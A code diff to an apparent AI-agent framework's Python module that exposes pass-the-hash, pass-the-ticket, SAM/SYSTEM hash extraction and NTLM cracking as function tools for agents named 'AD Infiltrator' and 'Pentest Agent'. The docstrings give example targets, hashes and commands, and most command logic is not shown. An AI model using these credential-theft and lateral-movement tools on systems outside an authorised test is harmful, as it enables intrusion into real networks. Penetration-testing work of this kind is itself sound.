@@ -6,41 +6,58 @@ Implements Pass-the-Hash and Pass-the-Ticket attacks for Windows networks.
 Uses Impacket-style tools for NTLM hash authentication.
 
 Primary Users:
-- Pentest Agent (Alpha-Red)
-- Network Analyst (Alpha-Silver)
+- AD Infiltrator: Active Directory lateral movement
+- Pentest Agent (Alpha-Red): Network penetration
+- Network Analyst (Alpha-Silver): Network reconnaissance
 """
 
-from typing import Any, Optional
+import json
+from typing import Any
 
+from kryon.sdk.agents import function_tool
 from kryon.tools.common import run_command
 
 
+@function_tool(strict_mode=False)
 def pass_the_hash(
     target: str,
     username: str,
     ntlm_hash: str,
-    domain: Optional[str] = ".",
-    command: Optional[str] = None,
-) -> dict[str, Any]:
+    domain: str = ".",
+    command: str = "",
+) -> str:
     """
-    Perform Pass-the-Hash attack to authenticate to remote system.
+    Perform Pass-the-Hash attack to authenticate to a remote Windows system
+    using an NTLM hash instead of a plaintext password. Uses pth-winexe for
+    remote command execution with hash-based authentication.
+
+    This is a core lateral movement technique that allows movement between
+    systems using harvested NTLM hashes without needing to crack them.
 
     Args:
-        target: Target IP or hostname
-        username: Username
-        ntlm_hash: NTLM hash (LM:NT or just NT hash)
-        domain: Domain name (defaults to local)
-        command: Optional command to execute
+        target: Target IP or hostname (e.g. 192.168.1.100)
+        username: Username to authenticate as (e.g. Administrator)
+        ntlm_hash: NTLM hash in LM:NT format
+                    (e.g. aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0)
+        domain: Domain name (defaults to "." for local authentication)
+        command: Command to execute on the remote system (defaults to cmd.exe)
 
     Returns:
-        Dictionary with attack result
+        str: JSON with success status, authentication result, and command output
 
-    Example:
-        >>> result = pass_the_hash(
-        ...     target="192.168.1.100",
-        ...     username="Administrator",
-        ...     ntlm_hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
-        ... )
+    Examples:
+        pass_the_hash(
+            target="192.168.1.100",
+            username="Administrator",
+            ntlm_hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        )
+        pass_the_hash(
+            target="dc01.corp.local",
+            username="svc_sql",
+            ntlm_hash="aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d",
+            domain="CORP",
+            command="whoami /all"
+        )
     """
     result = {"success": False, "output": "", "authenticated": False, "error": None}
 
@@ -67,30 +84,42 @@ def pass_the_hash(
     except Exception as e:
         result["error"] = str(e)
 
-    return result
+    return json.dumps(result)
 
 
+@function_tool(strict_mode=False)
 def pass_the_ticket(
     target: str,
     ticket_file: str,
-    service: Optional[str] = "cifs",
-) -> dict[str, Any]:
+    service: str = "cifs",
+) -> str:
     """
-    Perform Pass-the-Ticket attack using Kerberos ticket.
+    Perform Pass-the-Ticket attack using a Kerberos ticket (.kirbi or .ccache)
+    to authenticate to a remote service without needing the user's password.
+
+    Sets the KRB5CCNAME environment variable to the ticket file and uses
+    Kerberos authentication to access the target service. Commonly used after
+    extracting tickets via Rubeus, Mimikatz, or impacket-ticketer.
 
     Args:
-        target: Target system
-        ticket_file: Path to ticket file (.kirbi or .ccache)
-        service: Service to access (cifs, http, ldap)
+        target: Target system hostname or IP (e.g. dc01.corp.local)
+        ticket_file: Path to ticket file (.kirbi or .ccache format)
+        service: Service to access — one of: cifs, http, ldap, mssql
+                 (defaults to "cifs" for file share access)
 
     Returns:
-        Dictionary with attack result
+        str: JSON with success status, command output, and error details
 
-    Example:
-        >>> result = pass_the_ticket(
-        ...     target="dc01.domain.com",
-        ...     ticket_file="/tmp/admin.kirbi"
-        ... )
+    Examples:
+        pass_the_ticket(
+            target="dc01.corp.local",
+            ticket_file="/tmp/admin.kirbi"
+        )
+        pass_the_ticket(
+            target="sql01.corp.local",
+            ticket_file="/tmp/krbtgt.ccache",
+            service="mssql"
+        )
     """
     result = {"success": False, "output": "", "error": None}
 
@@ -112,29 +141,37 @@ def pass_the_ticket(
     except Exception as e:
         result["error"] = str(e)
 
-    return result
+    return json.dumps(result)
 
 
+@function_tool(strict_mode=False)
 def extract_ntlm_hash(
     sam_file: str,
     system_file: str,
-    output_file: Optional[str] = None,
-) -> dict[str, Any]:
+    output_file: str = "",
+) -> str:
     """
-    Extract NTLM hashes from SAM and SYSTEM registry hives.
+    Extract NTLM hashes from SAM and SYSTEM registry hives using
+    impacket-secretsdump. These hives can be obtained from a compromised
+    Windows system via shadow copy, reg save, or similar techniques.
 
     Args:
-        sam_file: Path to SAM hive
-        system_file: Path to SYSTEM hive
-        output_file: Optional output file for hashes
+        sam_file: Path to SAM hive file
+        system_file: Path to SYSTEM hive file
+        output_file: Optional output file path for extracted hashes
 
     Returns:
-        Dictionary with extracted hashes
+        str: JSON with success status and list of extracted hashes
 
-    Example:
-        >>> hashes = extract_ntlm_hash("/tmp/SAM", "/tmp/SYSTEM")
+    Examples:
+        extract_ntlm_hash(sam_file="/tmp/SAM", system_file="/tmp/SYSTEM")
+        extract_ntlm_hash(
+            sam_file="/tmp/SAM",
+            system_file="/tmp/SYSTEM",
+            output_file="/tmp/hashes.txt"
+        )
     """
-    result = {"success": False, "hashes": [], "error": None}
+    result: dict[str, Any] = {"success": False, "hashes": [], "error": None}
 
     try:
         # Use secretsdump from impacket
@@ -159,32 +196,44 @@ def extract_ntlm_hash(
     except Exception as e:
         result["error"] = str(e)
 
-    return result
+    return json.dumps(result)
 
 
+@function_tool(strict_mode=False)
 def crack_ntlm_hash(
     ntlm_hash: str,
     wordlist: str,
-    rules: Optional[str] = None,
-) -> dict[str, Any]:
+    rules: str = "",
+) -> str:
     """
-    Attempt to crack NTLM hash using hashcat or john.
+    Attempt to crack an NTLM hash using hashcat with a wordlist attack.
+    Uses hashcat mode 1000 (NTLM) for offline password recovery.
 
     Args:
-        ntlm_hash: NTLM hash to crack
-        wordlist: Path to wordlist
-        rules: Optional rules file for mangling
+        ntlm_hash: NTLM hash to crack (e.g. 31d6cfe0d16ae931b73c59d7e0c089c0)
+        wordlist: Path to wordlist file (e.g. /usr/share/wordlists/rockyou.txt)
+        rules: Optional path to rules file for password mangling
 
     Returns:
-        Dictionary with cracking result
+        str: JSON with cracking result including cracked password if successful
 
-    Example:
-        >>> result = crack_ntlm_hash(
-        ...     ntlm_hash="31d6cfe0d16ae931b73c59d7e0c089c0",
-        ...     wordlist="/usr/share/wordlists/rockyou.txt"
-        ... )
+    Examples:
+        crack_ntlm_hash(
+            ntlm_hash="31d6cfe0d16ae931b73c59d7e0c089c0",
+            wordlist="/usr/share/wordlists/rockyou.txt"
+        )
+        crack_ntlm_hash(
+            ntlm_hash="e52cac67419a9a224a3b108f3fa6cb6d",
+            wordlist="/usr/share/wordlists/rockyou.txt",
+            rules="/usr/share/hashcat/rules/best64.rule"
+        )
     """
-    result = {"success": False, "cracked": False, "password": None, "error": None}
+    result: dict[str, Any] = {
+        "success": False,
+        "cracked": False,
+        "password": None,
+        "error": None,
+    }
 
     try:
         # Try hashcat first
@@ -214,4 +263,4 @@ def crack_ntlm_hash(
     except Exception as e:
         result["error"] = str(e)
 
-    return result
+    return json.dumps(result)
